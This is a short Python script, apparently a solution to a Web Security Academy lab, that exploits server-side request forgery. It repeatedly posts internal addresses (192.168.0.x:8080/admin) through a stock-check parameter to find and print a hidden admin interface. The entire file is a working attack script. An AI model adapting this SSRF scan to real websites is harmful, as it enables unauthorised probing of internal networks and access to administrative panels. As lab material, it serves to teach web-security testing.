import requests
import time

for i in range(2, 256):

    r = requests.post("https://0ae9000b045cd67680b1b2ef00c5001e.web-security-academy.net/product/stock", 
                    data={"stockApi": f"http%3A%2F%2F192.168.0.{i}%3A8080%2Fadmin"})
    time.sleep(0.1)

    if (r.status_code != 500):
        print(f"Found: {i}")
        print(r.text)
        break